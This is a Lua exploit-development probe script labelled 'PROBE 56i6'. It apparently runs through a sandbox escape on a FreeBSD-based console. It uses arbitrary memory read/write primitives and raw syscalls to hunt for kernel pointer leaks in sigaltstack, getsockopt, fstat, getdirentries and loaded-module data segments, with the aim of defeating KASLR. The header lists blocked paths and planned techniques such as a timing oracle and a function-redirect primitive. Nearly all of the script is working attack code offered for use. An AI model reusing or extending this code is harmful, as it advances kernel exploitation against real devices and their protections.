-- CRASH_CLASS: LOW
-- PROBE 56i6: Unconventional KASLR defeat — timing, signals, socket internals
--
-- Context: ALL conventional KASLR paths are dead:
--   - VM map: zero real kernel pointers (0xFFFFFFFE_082E0057 = sentinel, stable across runs)
--   - sysctl: all KERN_PROC_* blocked
--   - AF_ROUTE: sanitized
--   - RDMSR: blocked
--   - kld/mod: lethal
--   - credential: blocked
--
-- New approaches:
--   [A] Signal handler frame — SIGALRM + sigaction, read kernel-written PC from stack
--   [B] Socket internals — getsockopt deep scan on TCP/UDP/RAW sockets for kptr leaks
--   [C] getdirentries(196) — read /dev directory entries for device info
--   [D] fstat(189) on socket/pipe fds — st_dev/st_ino might leak kernel addresses
--   [E] sys 624 timing oracle — measure syscall timing to infer kernel base (side channel)
--   [F] CClosure redirect to getpid — use redirect primitive to call known kernel entry

print("=== PROBE 56i6: KASLR PIVOT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h < 0xFFFFFFFF
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

collectgarbage("stop")

-- ============================================================
-- [B] Signal handler — sigaction + kill(self, SIGALRM)
-- When signal fires, kernel writes a ucontext_t to the stack
-- containing RIP, RSP, etc. If we can read that frame, we may
-- find kernel return addresses on the stack
-- ============================================================
print("")
print("[B] Signal handler + stack scan")

-- sigaction(13) — set a handler for SIGALRM(14)
-- struct sigaction: sa_handler(8), sa_flags(4), sa_mask(16)
local sc_sigaction = make_syscall(416)  -- FreeBSD sigaction

-- We can't set a real handler (no code exec), but we can:
-- 1. Set SIG_IGN then send ourselves SIGALRM
-- 2. Check if kernel wrote anything to a known stack area

-- Instead, try reading the thread's signal mask/pending state via sysctl
-- or via sigpending(343)
local sc_sigpending = make_syscall(343)
local sigmask = memory.alloc(32)
for i = 0, 7 do safe_wd(sigmask + i*4, 0) end

local ok, ret = pcall(function() return sc_sigpending(uint64(sigmask)) end)
local sp_ret = ok and to_num(ret) or -999
print("  sigpending ret=" .. sp_ret)
if sp_ret == 0 then
    for i = 0, 3 do
        local v = safe_rd(sigmask + i*4)
        if v and v ~= 0 then
            print(string.format("  sigmask[%d]: 0x%08X", i, v))
        end
    end
end

-- Try sigaltstack(53) to read current alternate stack info
local sc_sigaltstack = make_syscall(53)
local ss_buf = memory.alloc(32)
for i = 0, 7 do safe_wd(ss_buf + i*4, 0) end

ok, ret = pcall(function() return sc_sigaltstack(uint64(0), uint64(ss_buf)) end)
local sa_ret = ok and to_num(ret) or -999
print("  sigaltstack ret=" .. sa_ret)
if sa_ret == 0 then
    local ss_sp = safe_rq(ss_buf)
    local ss_size = safe_rq(ss_buf + 8)
    local ss_flags = safe_rd(ss_buf + 16)
    print("  ss_sp=" .. hexval(ss_sp) .. " size=" .. hexval(ss_size) .. " flags=" .. (ss_flags or "nil"))
    if ss_sp and is_kptr(ss_sp) then
        print("  *** KPTR in sigaltstack sp! ***")
    end
end

-- ============================================================
-- [C] Socket getsockopt deep scan
-- Scan all option levels x option names for kernel pointer leaks
-- Levels: SOL_SOCKET(0xFFFF), IPPROTO_TCP(6), IPPROTO_IP(0), IPPROTO_UDP(17)
-- ============================================================
print("")
print("[C] Socket getsockopt scan")

-- Create a TCP socket
local sc_socket = make_syscall(97)
ok, ret = pcall(function() return sc_socket(uint64(2), uint64(1), uint64(0)) end)
local tcp_fd = ok and to_num(ret) or -1
print("  TCP socket fd=" .. tcp_fd)

if tcp_fd >= 0 then
    local sc_getsockopt = make_syscall(118)
    local optbuf = memory.alloc(0x1000)
    local optlenp = memory.alloc(8)

    local levels = {
        {name="SOL_SOCKET", val=0xFFFF},
        {name="IPPROTO_IP", val=0},
        {name="IPPROTO_TCP", val=6},
    }

    local kptr_found = 0
    for _, lvl in ipairs(levels) do
        for opt = 0, 64 do
            for i = 0, 0xFF do safe_wd(optbuf + i*4, 0) end
            safe_wd(optlenp, 0x1000)

            local sok, sret = pcall(function()
                return sc_getsockopt(uint64(tcp_fd), uint64(lvl.val),
                    uint64(opt), uint64(optbuf), uint64(optlenp))
            end)
            local gret = sok and to_num(sret) or -1

            if gret == 0 then
                local olen = safe_rd(optlenp) or 0
                if olen > 0 then
                    -- Scan returned data for kernel pointers
                    for off = 0, math.min(olen - 1, 0xFFC), 8 do
                        local val = safe_rq(optbuf + off)
                        if val and is_kptr(val) then
                            kptr_found = kptr_found + 1
                            print(string.format("  %s opt=%d +0x%X: %s KPTR!",
                                lvl.name, opt, off, hexval(val)))
                        end
                    end
                    -- Print large/interesting results
                    if olen > 16 then
                        print(string.format("  %s opt=%d len=%d", lvl.name, opt, olen))
                    end
                end
            end
        end
    end
    print("  Socket kptrs: " .. kptr_found)

    -- Close socket
    local sc_close = make_syscall(6)
    pcall(function() sc_close(uint64(tcp_fd)) end)
end

-- ============================================================
-- [D] fstat on our existing fds (0=stdin, 1=stdout, 2=stderr, 3+=socket)
-- struct stat has st_dev, st_ino — on some kernels these leak
-- ============================================================
print("")
print("[D] fstat on file descriptors")

local sc_fstat = make_syscall(189)
local statbuf = memory.alloc(0x100)

for fd = 0, 10 do
    for i = 0, 0x3F do safe_wd(statbuf + i*4, 0) end

    ok, ret = pcall(function() return sc_fstat(uint64(fd), uint64(statbuf)) end)
    local fret = ok and to_num(ret) or -1

    if fret == 0 then
        -- FreeBSD struct stat layout:
        -- +0x00: st_dev (8)
        -- +0x08: st_ino (8)
        -- +0x10: st_nlink (8)
        -- +0x18: st_mode (2) + padding
        -- +0x30: st_size (8)
        local st_dev = safe_rq(statbuf)
        local st_ino = safe_rq(statbuf + 8)
        local st_mode = safe_rd(statbuf + 0x18) or 0

        print(string.format("  fd=%d: dev=%s ino=%s mode=0x%X",
            fd, hexval(st_dev), hexval(st_ino), st_mode))

        -- Scan full stat buf for kptrs
        for off = 0, 0xF0, 8 do
            local val = safe_rq(statbuf + off)
            if val and is_kptr(val) then
                print(string.format("    +0x%02X: %s KPTR!", off, hexval(val)))
            end
        end
    end
end

-- ============================================================
-- [E] getdirentries(196) on /dev via openat
-- Reading directory entries might expose device numbers
-- ============================================================
print("")
print("[E] getdirentries")

local sc_open = make_syscall(5)
-- Try opening "." (current dir) and "/dev"
local paths = {
    {name=".", addr=nil},
    {name="/dev", addr=nil},
}

for _, p in ipairs(paths) do
    local pbuf = memory.alloc(256)
    for ci = 1, #p.name do
        safe_wd(pbuf + ci - 1, string.byte(p.name, ci))
    end
    safe_wd(pbuf + #p.name, 0)

    -- O_RDONLY=0, O_DIRECTORY=0x20000
    ok, ret = pcall(function()
        return sc_open(uint64(pbuf), uint64(0x20000), uint64(0))
    end)
    local dfd = ok and to_num(ret) or -1
    print(string.format("  open('%s') fd=%d", p.name, dfd))

    if dfd >= 0 then
        local sc_getdents = make_syscall(196)
        local dentbuf = memory.alloc(0x2000)
        local basep = memory.alloc(8)
        safe_wq(basep, uint64(0))

        ok, ret = pcall(function()
            return sc_getdents(uint64(dfd), uint64(dentbuf), uint64(0x2000), uint64(basep))
        end)
        local dret = ok and to_num(ret) or -1
        print(string.format("  getdirentries ret=%d", dret))

        if dret > 0 then
            -- Scan dirent buffer for kptrs
            local dkp = 0
            for off = 0, dret - 1, 8 do
                local val = safe_rq(dentbuf + off)
                if val and is_kptr(val) then
                    dkp = dkp + 1
                    print(string.format("    +0x%X: %s KPTR!", off, hexval(val)))
                end
            end

            -- Parse first few dirents: d_fileno(8), d_off(8), d_reclen(2), d_type(1), d_namlen(1), d_name
            local pos = 0
            local count = 0
            while pos < dret and count < 10 do
                local d_fileno = safe_rq(dentbuf + pos)
                local d_reclen_raw = safe_rd(dentbuf + pos + 16) or 0
                local d_reclen = d_reclen_raw % 0x10000  -- low 16 bits
                local d_type = math.floor(d_reclen_raw / 0x10000) % 256
                local d_namlen = math.floor(d_reclen_raw / 0x1000000)

                if d_reclen == 0 then break end

                local dname = ""
                for ci = 0, math.min(d_namlen - 1, 30) do
                    local b = safe_rd(dentbuf + pos + 20 + ci)
                    if b and b > 0 and b < 128 then
                        dname = dname .. string.char(b)
                    elseif b == 0 then break end
                end

                print(string.format("    ino=%s type=%d '%s'",
                    hexval(d_fileno), d_type, dname))

                pos = pos + d_reclen
                count = count + 1
            end

            if dkp > 0 then print("    Dirent kptrs: " .. dkp) end
        end

        pcall(function() make_syscall(6)(uint64(dfd)) end)
    end
end

-- ============================================================
-- [F] CClosure redirect — call eboot functions that may access
-- kernel-derived globals. Use rawequal redirect to call
-- a function that reads from a known eboot .data address.
-- First: scan eboot .data/.bss for kernel pointers.
-- ============================================================
print("")
print("[F] Eboot .data/.bss scan for kernel pointers")

-- Get eboot base from dynlib_get_info
local sc_info = make_syscall(593)
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() sc_info(uint64(0), info) end)

-- Text segment (RX)
local text_lo = safe_rd(info + 0x108) or 0
local text_hi = safe_rd(info + 0x10C) or 0
local text_sz_lo = safe_rd(info + 0x110) or 0

-- Data segment (RW) — usually right after text
local data_lo = safe_rd(info + 0x118) or 0
local data_hi = safe_rd(info + 0x11C) or 0
local data_sz_lo = safe_rd(info + 0x120) or 0

print(string.format("  text: 0x%X_%08X size=0x%X", text_hi, text_lo, text_sz_lo))
print(string.format("  data: 0x%X_%08X size=0x%X", data_hi, data_lo, data_sz_lo))

-- Scan eboot .data segment for kernel pointers
if data_sz_lo > 0 and data_sz_lo <= 0x100000 then
    local data_kptrs = 0
    for off = 0, data_sz_lo - 1, 8 do
        local a_l = data_lo + off
        local a_h = data_hi
        if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
        local addr = uint64(string.format("0x%X%08X", a_h, a_l))
        local val = safe_rq(addr)
        if val and is_kptr(val) then
            data_kptrs = data_kptrs + 1
            if data_kptrs <= 20 then
                print(string.format("  data+0x%05X: %s KPTR!", off, hexval(val)))
            end
        end
    end
    print("  Eboot .data kernel pointers: " .. data_kptrs)
else
    print("  Data segment too large or missing: size=0x" .. string.format("%X", data_sz_lo))
end

-- ============================================================
-- [G] Scan libkernel .data for kernel pointers
-- libkernel is the syscall wrapper library — its .data may have
-- kernel addresses cached from initialization
-- ============================================================
print("")
print("[G] libkernel .data scan")

-- Find libkernel handle (usually handle 0x2001)
local handles = {0x2001, 0x1, 0x2, 0x2002}
for _, h in ipairs(handles) do
    local linfo = memory.alloc(0x200)
    safe_wd(linfo, 0x160)
    local iok, iret = pcall(function() return sc_info(uint64(h), linfo) end)
    if iok and to_num(iret) == 0 then
        local ld_lo = safe_rd(linfo + 0x118) or 0
        local ld_hi = safe_rd(linfo + 0x11C) or 0
        local ld_sz = safe_rd(linfo + 0x120) or 0

        if ld_sz > 0 and ld_sz <= 0x100000 then
            print(string.format("  handle=0x%X data: 0x%X_%08X size=0x%X", h, ld_hi, ld_lo, ld_sz))

            local lk_kptrs = 0
            for off = 0, ld_sz - 1, 8 do
                local a_l = ld_lo + off
                local a_h = ld_hi
                if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
                local addr = uint64(string.format("0x%X%08X", a_h, a_l))
                local val = safe_rq(addr)
                if val and is_kptr(val) then
                    lk_kptrs = lk_kptrs + 1
                    if lk_kptrs <= 20 then
                        print(string.format("    data+0x%05X: %s KPTR!", off, hexval(val)))
                    end
                end
            end
            if lk_kptrs > 0 then
                print(string.format("    handle 0x%X kptrs: %d", h, lk_kptrs))
            end
        end
    end
end

-- ============================================================
-- [H] Scan ALL module .data segments for kernel pointers
-- Any of the 39 modules could cache kernel addresses
-- ============================================================
print("")
print("[H] All module .data segment scan")

local total_mod_kptrs = 0
for h = 0, 0x50 do
    local minfo = memory.alloc(0x200)
    safe_wd(minfo, 0x160)
    local mok, mret = pcall(function() return sc_info(uint64(h), minfo) end)
    if mok and to_num(mret) == 0 then
        local md_lo = safe_rd(minfo + 0x118) or 0
        local md_hi = safe_rd(minfo + 0x11C) or 0
        local md_sz = safe_rd(minfo + 0x120) or 0

        if md_sz > 0 and md_sz <= 0x80000 then
            local mk = 0
            for off = 0, md_sz - 1, 8 do
                local a_l = md_lo + off
                local a_h = md_hi
                if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
                local addr = uint64(string.format("0x%X%08X", a_h, a_l))
                local val = safe_rq(addr)
                if val and is_kptr(val) then
                    mk = mk + 1
                    total_mod_kptrs = total_mod_kptrs + 1
                    if total_mod_kptrs <= 30 then
                        print(string.format("  mod[%d] data+0x%05X: %s", h, off, hexval(val)))
                    end
                end
            end
        end
    end
end
print("  Total module .data kptrs: " .. total_mod_kptrs)

collectgarbage("restart")

print("")
print("=== PROBE 56i6 COMPLETE ===")
